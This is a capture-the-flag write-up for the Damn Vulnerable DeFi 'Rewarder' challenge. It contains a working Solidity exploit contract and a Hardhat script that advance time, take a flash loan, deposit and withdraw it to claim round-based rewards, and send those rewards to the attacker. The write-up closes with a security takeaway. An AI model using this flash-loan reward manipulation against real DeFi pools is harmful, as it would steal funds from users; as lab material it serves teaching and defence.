# Level 5 : The Rewarder

This one was for me a hard one.I think for this kind of case , the first thing to is to take a blank paper and try to understand how each functions interacts with each others in contracts.

Reading the description , one thing we had to do was to retrieve rewards, from that I tried to search the vulnerability on TheRewarderPool.sol and I was lucky enough to find something to test.

**Rewards are distributed by round (big mistake)** and as with simple javascript command we can set the time we want , so that we can be at the beginning of each round.

From that the first idea that came to my mind was to try to borrow all amount available on the FlashLoanerPool, implement on our contract the `function receiveFlashLoan(uint256 amount) external{}` and set up our hack execution within it.

To hack these contracts we have to do 6 things :  

1. Increase time to 5 days
2. Do a flashLoan with maximum amount available
3. Deposit the flash loan amount in the rewarder pool to trigger rewards distribution
4. Withdraw deposit
5. Pay Back the flashLoan
6. Send rewards to the attacker

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
contract ExploitRewarder {
    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private theRewarderPool;
    RewardToken private rewardToken;
    DamnValuableToken private dvt;
    address private attacker;
    uint256 maxAmount;
    constructor(address _flashLoanerPool,address _theRewarderPool,address _rewardToken,address _dvt,uint256 amount){
      attacker=msg.sender;
      flashLoanerPool=FlashLoanerPool(_flashLoanerPool);
      theRewarderPool = TheRewarderPool(_theRewarderPool);
      rewardToken = RewardToken(_rewardToken);
      dvt = DamnValuableToken(_dvt);
      maxAmount = amount;
    }
    function attack() public {
      flashLoanerPool.flashLoan(maxAmount); // 1. Take Out a flashLoan
    }
    function receiveFlashLoan(uint256 amount) external{
      dvt.approve(address(theRewarderPool),amount);
      theRewarderPool.deposit(amount); // 2. Deposit the flash loan amount in the rewarder pool to trigger rewards distribution
      theRewarderPool.withdraw(amount); // 3. Withdraw deposit
      dvt.transfer(address(flashLoanerPool),amount); // 4. Pay back the flash Loan
      rewardToken.transfer(attacker,rewardToken.balanceOf(address(this))); // Send rewards to the attacker
    }
}
```

```jsx
await ethers.provider.send("evm_increaseTime",[5*24*60*60]);
const Attacker = await ethers.getContractFactory('ExploitRewarder', attacker)
this.attackerContract = await Attacker.deploy(this.flashLoanPool.address,this.rewarderPool.address,this.rewardToken.address,this.liquidityToken.address,TOKENS_IN_LENDER_POOL);
await this.attackerContract.connect(attacker).attack();
```

## Key Security Takeaways

- Implement rewards for money that stay in your pool in seconds, not using rounds : [https://solidity-by-example.org/defi/staking-rewards/](https://solidity-by-example.org/defi/staking-rewards/)